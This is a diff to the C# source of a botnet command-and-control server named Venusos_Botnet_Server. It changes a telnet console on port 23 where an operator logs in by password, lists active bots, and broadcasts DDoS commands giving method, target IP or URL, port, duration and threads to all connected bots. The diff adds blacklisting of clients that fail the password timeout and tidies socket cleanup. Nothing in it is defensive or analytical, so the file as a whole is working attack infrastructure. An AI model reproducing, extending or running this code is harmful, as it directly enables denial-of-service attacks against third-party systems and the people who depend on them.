@@ -10,27 +10,35 @@ namespace Venusos_Botnet_Server
     {
         public static void StartListener()
         {
+            TcpClient tcpClient = null;
+            TcpListener tcpListener = null;
+            NetworkStream networkStream = null;
             string password = Tools.GetPassword();
 
             Console.WriteLine("Telnet console is avaiable on {0}:23", Tools.GetLocalIP());
 
             while (true)
             {
-                TcpListener tcpListener = new TcpListener(Tools.GetLocalIP(), 23);
-                tcpListener.Start();
-
                 try
                 {
+                    tcpListener = new TcpListener(Tools.GetLocalIP(), 23);
+                    tcpListener.Start();
+
                     int i = 0;
                     string data = "";
                     bool logged = false;
-                    bool justLogged = false;
                     byte[] bytes = new byte[256];
 
-                    TcpClient tcpClient = tcpListener.AcceptTcpClient();
-                    NetworkStream networkStream = tcpClient.GetStream();
+                    tcpClient = tcpListener.AcceptTcpClient();
+                    networkStream = tcpClient.GetStream();
 
                     Console.WriteLine("\n [*] New connection request from {0}", ((IPEndPoint)tcpClient.Client.RemoteEndPoint).Address);
+
+                    if (Tools.IsBlacklisted(tcpClient))
+                    {
+                        Console.WriteLine("     - IP is blacklisted");
+                        tcpClient.Close();
+                    }
 
                     networkStream.Write(Encoding.ASCII.GetBytes("Enter password: "));
 
@@ -43,12 +51,14 @@ namespace Venusos_Botnet_Server
                         {
                             if (logged)
                             {
+                                networkStream.Write(Encoding.ASCII.GetBytes("Hello, type ping to list active bots or ddos to see ddos command syntax!\n"));
                                 break;
                             }
                             else if (timer.Elapsed.TotalSeconds > 5)
                             {
+                                Console.WriteLine("     - Password timeout");
+                                Tools.BlacklistTcpClient(tcpClient);
                                 tcpClient.Close();
-                                Console.WriteLine(" - Password timeout");
                                 break;
                             }
                         }
@@ -59,30 +69,13 @@ namespace Venusos_Botnet_Server
                     while ((i = networkStream.Read(bytes)) != 0)
                     {
                         data = Encoding.ASCII.GetString(bytes, 0, i);
+                        BotsServer.tcpClients.RemoveAll(x => !x.Connected);
 
-                        if (!logged)
+                        if (logged)
                         {
-                            if (data == password)
+                            if (data[0..4] is "ping")
                             {
-                                logged = true;
-                                justLogged = true;
-                                Console.WriteLine(" - Client connected");
-                            }
-                        }
-                        else
-                        {
-                            BotsServer.tcpClients.RemoveAll(x => !x.Connected);
-
-                            if (justLogged)
-                            {
-                                justLogged = false;
-                                networkStream.Write(Encoding.ASCII.GetBytes("Hello, type ping to list active bots or ddos to see ddos command syntax!\n"));
-                            }
-
-                            if (data.StartsWith("ping"))
-                            {
-                                int alive;
-                                alive = 0;
+                                int alive = 0;
 
                                 foreach (TcpClient bot in BotsServer.tcpClients)
                                 {
@@ -93,29 +86,30 @@ namespace Venusos_Botnet_Server
                                     }
                                 }
 
-                                networkStream.Write(Encoding.ASCII.GetBytes(alive + " bots are alive in total.\n"));
+                                networkStream.Write(Encoding.ASCII.GetBytes("\n" + alive + " bots are alive\n"));
                             }
-                            else if (data.StartsWith("ddos"))
+                            else if (data[0..4] is "ddos")
                             {
-                                if (data.StartsWith("ddos "))
+                                try
                                 {
-                                    try
+                                    Command command = Tools.CreateCommand(data);
+                                    foreach (TcpClient bot in BotsServer.tcpClients)
                                     {
-                                        Command command = Tools.CreateCommand(data);
-                                        foreach (TcpClient bot in BotsServer.tcpClients)
-                                        {
-                                            BotsServer.Send(bot, JsonSerializer.Serialize(command));
-                                        }
-                                    }
-                                    catch (Exception e)
-                                    {
-                                        networkStream.Write(Encoding.ASCII.GetBytes(e.Message));
+                                        BotsServer.Send(bot, JsonSerializer.Serialize(command));
                                     }
                                 }
-                                else
+                                catch (Exception e)
                                 {
-                                    networkStream.Write(Encoding.ASCII.GetBytes("ddos [METHOD] [IP/URL] [PORT] [DURATION] [THREADS]\n"));
+                                    networkStream.Write(Encoding.ASCII.GetBytes("ddos [METHOD] [IP/URL] [PORT] [DURATION] [THREADS]\n\nErrors:\n" + e.Message));
                                 }
+                            }
+                        }
+                        else if (!logged)
+                        {
+                            if (data == password)
+                            {
+                                logged = !logged;
+                                Console.WriteLine("     + Client connected");
                             }
                         }
                     }
@@ -124,11 +118,24 @@ namespace Venusos_Botnet_Server
                 {
 
                 }
-                finally
+
+                try
                 {
-                    Console.WriteLine(" - Client disconnected");
+                    networkStream.Close();
+                }
+                catch { }
+                try
+                {
+                    tcpClient.Close();
+                }
+                catch { }
+                try
+                {
                     tcpListener.Stop();
                 }
+                catch { }
+
+                Console.WriteLine("     - Client disconnected");
             }
         }
     }
